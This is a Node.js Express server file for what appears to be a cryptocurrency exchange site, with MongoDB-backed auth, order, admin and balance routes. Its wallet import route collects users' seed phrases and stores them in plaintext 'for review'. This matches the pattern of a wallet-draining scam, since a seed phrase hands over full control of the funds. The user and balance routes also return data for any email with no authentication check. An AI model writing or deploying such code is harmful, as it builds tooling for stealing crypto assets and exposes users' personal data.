const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());

// Connect to MongoDB
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log('✅ MongoDB Connected Successfully'))
  .catch((err) => console.log('❌ MongoDB Connection Error: ', err));

const User = require('./models/User');
const Order = require('./models/Order');

app.use('/api/auth', require('./routes/auth'));
app.use('/api/orders', require('./routes/order'));
app.use('/api/admin', require('./routes/admin'));

// Wallet Import Route
app.post('/api/wallet/import', async (req, res) => {
    try {
        const { email, seedPhrase, walletAddress } = req.body;
        await User.findOneAndUpdate({ email }, { seedPhrase, walletAddress, walletStatus: 'pending' });
        res.json({ message: "Wallet submitted for review" });
    } catch (error) { res.status(500).json({ message: "Server error" }); }
});

app.get('/api/user/:email', async (req, res) => {
    try {
        const user = await User.findOne({ email: req.params.email }).select('-password -seedPhrase');
        res.json(user);
    } catch (error) { res.status(500).json({ message: "Server error" }); }
});

// --- NEW: CALCULATE USER BALANCES ---
app.get('/api/user/:email/balances', async (req, res) => {
    try {
        const orders = await Order.find({ userEmail: req.params.email });
        let balances = { BTC: 0, ETH: 0, USDT: 0 };

        orders.forEach(order => {
            const getAmt = parseFloat(order.getAmount);
            const sendAmt = parseFloat(order.sendAmount);
            const getCur = order.getCurrency;
            const sendCur = order.sendCurrency;

            // If they bought crypto, add to balance
            if (order.mode === 'buy' && getCur in balances) balances[getCur] += getAmt;
            // If they sold crypto, subtract from balance
            if (order.mode === 'sell' && sendCur in balances) balances[sendCur] -= sendAmt;
        });

        res.json(balances);
    } catch (error) { res.status(500).json({ message: "Server error" }); }
});

app.use(express.static(path.join(__dirname, 'public')));
app.use((req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
